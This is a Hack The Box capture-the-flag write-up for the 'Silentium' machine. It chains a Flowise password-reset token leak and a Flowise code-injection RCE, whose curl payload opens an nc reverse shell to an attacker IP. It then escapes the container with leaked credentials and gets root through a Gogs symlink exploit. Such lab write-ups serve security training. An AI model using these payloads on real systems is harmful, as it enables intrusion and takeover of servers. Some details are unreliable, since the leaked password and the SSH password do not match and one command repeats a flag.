# Machine: Silentium

Date: 22-05-2026
Platform: Hack The Box
Author: atrix187
Difficulty: Easy

---

## Vulnerabilities Exploited

- **CVE-2025-58434** — Unauthenticated Password Reset Token Disclosure
- **CVE-2025-59528** — Flowise Remote Code Execution (RCE)
- **CVE-2025-8110** — Gogs API-Based Symbolic Link Manipulation RCE

---

## Recon

### Nmap

```bash
sudo nmap -sV -sC -T4 10.129.2.131
```

**Results:**

- Port 22 → OpenSSH 9.6p1 (Ubuntu)
- Port 80 → nginx 1.24.0 (Ubuntu)

**Notes:**

- HTTP title showed a redirect to `http://silentium.htb/`. Domain is not publicly resolvable.
- Added to `/etc/hosts`: `10.129.2.131 silentium.htb`

---

## Enumeration

### Directory Enumeration

Initial directory brute-forcing returned `304 Not Modified` on every path. The server uses a catch-all/wildcard routing system that redirects all non-existent paths back to the default home page — standard directory enumeration is useless here.

### Subdomain Fuzzing

Pivoted to subdomain enumeration using `ffuf` with a SecLists wordlist. Filtered out the wildcard noise by excluding `301` responses and response sizes of `178` bytes.

```bash
ffuf -u http://silentium.htb/ \
  -H "Host: FUZZ.silentium.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs 178 -fc 301
```

**Findings:**

- `staging.silentium.htb` — administrative login portal (Flowise), HTTP 200, size 3142

Added to `/etc/hosts`: `10.129.2.131 staging.silentium.htb`

### Application Fingerprinting

- `http://staging.silentium.htb` → Flowise dashboard behind a login portal requiring email + password
- SQL injection payloads on login fields — handled safely, no backend injection
- Clicking login with empty fields briefly flashes the dashboard before redirecting back — confirmed Flowise is the underlying app
- Burp Suite intercept showed the app making `GET /api/v1/chatflows` requests, receiving `401 Unauthorized` with `{"message":"Invalid or Missing Token"}`

```bash
# Version check
GET /api/v1/version
# Response: {"version":"3.0.5"}
```

---

## Exploitation

### CVE-2025-58434 — Unauthenticated Password Reset Token Disclosure → Account Takeover

The password reset logic in Flowise ≤ 3.0.5 does not validate the reset token server-side before disclosing user data. Sending a password reset request through Burp's Repeater causes the API to leak the full user object including the `tempToken` in plaintext — no valid token required to receive it.

The exploit requires a valid email address. Default guesses like `admin@silentium.htb` failed. Reviewed the public landing page at `http://silentium.htb` and found an "Institutional Leadership" section listing three names: Marcus Thorne, Ben, Elena Rossi. Converted to standard corporate email format and tested each against the "Forgot Password" portal — `ben@silentium.htb` was confirmed valid.

**Steps:**

**1. Trigger password reset for the target account:**

Navigate to `http://staging.silentium.htb/forgot-password`, enter `ben@silentium.htb`, submit.

**2. Intercept the request in Burp and send to Repeater. The API response leaks the full user object:**

```json
"user": {
  "id": "e26c9d6c-678c-4c10-9e36-01813e8fea73",
  "name": "admin",
  "email": "ben@silentium.htb",
  "credential": "$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG",
  "tempToken": "2WVhjqlxoH8aMng9wcbosQf3saDtT3zm3FsLoQbeUpCieuGj6LNbU42G1GKvv88O",
  "tokenExpiry": "2026-05-22T09:36:14.920Z",
  "status": "active"
}
```

**3. Use the `tempToken` to reset the password via `POST /api/v1/account/reset-password`:**

```json
{
  "email": "ben@silentium.htb",
  "tempToken": "2WVhjqlxoH8aMng9wcbosQf3saDtT3zm3FsLoQbeUpCieuGj6LNbU42G1GKvv88O",
  "password": "Bingo123!"
}
```

**Result:** `HTTP 201 Created` — password updated. Logged in as administrator with full Flowise dashboard access.

---

### CVE-2025-59528 — Flowise RCE via MCP Server Config Injection

Flowise 3.0.5 allows unauthenticated (or in this case authenticated) injection of arbitrary Node.js code through the `mcpServerConfig` field in the Tool component. The payload abuses `process.mainModule.require('child_process')` to spawn a reverse shell.

Initial attempt through Burp Suite returned `200 OK` but the listener didn't catch a connection. Switched to `curl` for direct API delivery.

**Steps:**

**1. Start listener:**

```bash
nc -lvnp 4444
```

**2. Send the payload via curl:**

```bash
curl -X POST http://staging.silentium.htb/api/v1/tools \
  -H "Content-Type: application/json" \
  -d '{
    "loadMethod": "listActions",
    "inputs": {
      "mcpServerConfig": "({x:(function(){const cp=process.mainModule.require(\"child_process\");cp.exec(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.117 4444 >/tmp/f\");return 1;})()} )"
    }
  }'
```

**Result:** Reverse shell caught as `root` — but inside a Docker container.

---

## Privilege Escalation

### Phase 1: Container Escape via Leaked Credentials

```bash
whoami
# root (inside container)

env
# FLOWISE_PASSWORD=F1l3_d0ck3r
# FLOWISE_USERNAME=ben
# SMTP_HOST=mailhog
# ...
```

The `env` output leaked cleartext credentials. Port 22 was open on the host from the initial Nmap scan.

```bash
ssh ben@10.129.2.131
# password: r04D!!_R4ge
```

**Result:** SSH shell as `ben` on the main host. User flag at `~/user.txt`.

---

### Phase 2: Root via CVE-2025-8110 — Gogs Symbolic Link RCE

```bash
# Enumerate running processes
ps aux

# Gogs identified at /opt/gogs/gogs/gogs
/opt/gogs/gogs/gogs --version
# Gogs version 0.13.3
```

CVE-2025-8110 affects Gogs 0.13.3. An attacker with a valid Gogs account can create a repository containing a malicious symbolic link that points to `.git/config`. When pushed, Gogs overwrites the server-side `.git/config` with attacker-controlled content, enabling arbitrary command execution on the backend.

**Internal port recon to locate Gogs:**

```bash
netstat -tulpn | grep 127.0.0.1
# 127.0.0.1:1025  (MailHog SMTP)
# 127.0.0.1:8025  (MailHog web)
# 127.0.0.1:3000  (Flowise — confirmed via curl)
# 127.0.0.1:3001  (Gogs — only remaining web port)
# 127.0.0.1:39619 (internal background, no web panel)
```

**Steps:**

**1. Forward port 3001 to local machine:**

```bash
ssh -L 3001:127.0.0.1:3001 ben@10.129.2.131
```

**2. Access `http://localhost:3001`, register a new account, create a repository, generate a personal access token.**

**3. Set up listener:**

```bash
nc -lvnp 5555
```

**4. Run the exploit script (by TYehan — automates symlink creation, repo push, and RCE trigger):**

```bash
python3 payload.py -t http://localhost:3001 -un hacker -pw Bingo123! -t 3cab1faf304781404e7c341e901ebc193ac03d49
```

The script clones the repo, creates a `malicious_link` symlink targeting `.git/config`, commits, and pushes. Gogs processes the symlink server-side, overwriting `.git/config` with the payload and triggering the reverse shell.

**Result:** Shell caught as `root` on the host. Root flag at `/root/root.txt`.

---

## Loot / Flags

- **user.txt:** `4d2****************************` → `/home/ben/user.txt`
- **root.txt:** `777****************************` → `/root/root.txt`

---

## Lessons Learned

- Wildcard/catch-all routing blocks directory brute-forcing — pivot to subdomain fuzzing early when directory enum produces uniform response codes.
- OSINT on the target's own public-facing site (leadership pages, about sections) is a reliable source of valid usernames before attempting credential attacks.
- When Burp fails to deliver a payload that should work (200 OK but no callback), switch to `curl` — browser-proxied requests can have CORS or header constraints that raw `curl` bypasses.
- Container escape via `env` credential leak is a quick win when the host has SSH open — always dump env vars immediately after landing in a container.
- After getting a low-priv shell, `ps aux` is often more informative than `sudo -l` on hardened boxes — internal services running as root are common privesc paths.
- Port inference via elimination (MailHog known from env, Flowise confirmed via curl, high-port ignored) is faster than scanning each port blindly.
